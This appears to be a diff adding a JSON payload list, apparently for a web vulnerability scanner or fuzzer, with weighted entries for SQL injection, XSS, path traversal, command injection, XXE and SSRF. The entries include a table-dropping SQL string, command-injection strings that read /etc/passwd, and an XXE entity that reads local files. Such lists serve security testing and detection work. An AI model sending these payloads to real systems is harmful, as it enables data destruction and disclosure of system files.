@@ -1,0 +1,130 @@
+{
+  "payloads": [
+    {
+      "type": "sqli",
+      "vector": "query",
+      "payload": "' OR '1'='1",
+      "weight": 10
+    },
+    {
+      "type": "sqli",
+      "vector": "query",
+      "payload": "1' AND '1'='1",
+      "weight": 10
+    },
+    {
+      "type": "sqli",
+      "vector": "query",
+      "payload": "1 UNION SELECT NULL--",
+      "weight": 15
+    },
+    {
+      "type": "sqli",
+      "vector": "query",
+      "payload": "1; DROP TABLE users--",
+      "weight": 20
+    },
+    {
+      "type": "sqli",
+      "vector": "query",
+      "payload": "1' ORDER BY 1--",
+      "weight": 8
+    },
+    {
+      "type": "xss",
+      "vector": "query",
+      "payload": "<script>alert(1)</script>",
+      "weight": 10
+    },
+    {
+      "type": "xss",
+      "vector": "query",
+      "payload": "<img src=x onerror=alert(1)>",
+      "weight": 12
+    },
+    {
+      "type": "xss",
+      "vector": "query",
+      "payload": "javascript:alert(1)",
+      "weight": 10
+    },
+    {
+      "type": "xss",
+      "vector": "query",
+      "payload": "<svg onload=alert(1)>",
+      "weight": 12
+    },
+    {
+      "type": "xss",
+      "vector": "query",
+      "payload": "\"><script>alert(1)</script>",
+      "weight": 15
+    },
+    {
+      "type": "lfi",
+      "vector": "query",
+      "payload": "../../../etc/passwd",
+      "weight": 10
+    },
+    {
+      "type": "lfi",
+      "vector": "query",
+      "payload": "..%2F..%2F..%2Fetc%2Fpasswd",
+      "weight": 12
+    },
+    {
+      "type": "lfi",
+      "vector": "query",
+      "payload": "/etc/passwd",
+      "weight": 8
+    },
+    {
+      "type": "lfi",
+      "vector": "query",
+      "payload": "....//....//....//etc/passwd",
+      "weight": 15
+    },
+    {
+      "type": "rce",
+      "vector": "query",
+      "payload": "; ls -la",
+      "weight": 15
+    },
+    {
+      "type": "rce",
+      "vector": "query",
+      "payload": "| cat /etc/passwd",
+      "weight": 15
+    },
+    {
+      "type": "rce",
+      "vector": "query",
+      "payload": "`whoami`",
+      "weight": 10
+    },
+    {
+      "type": "rce",
+      "vector": "query",
+      "payload": "$(whoami)",
+      "weight": 10
+    },
+    {
+      "type": "xxe",
+      "vector": "query",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "weight": 15
+    },
+    {
+      "type": "ssrf",
+      "vector": "query",
+      "payload": "http://localhost/",
+      "weight": 8
+    },
+    {
+      "type": "ssrf",
+      "vector": "query",
+      "payload": "http://127.0.0.1/",
+      "weight": 8
+    }
+  ]
+}
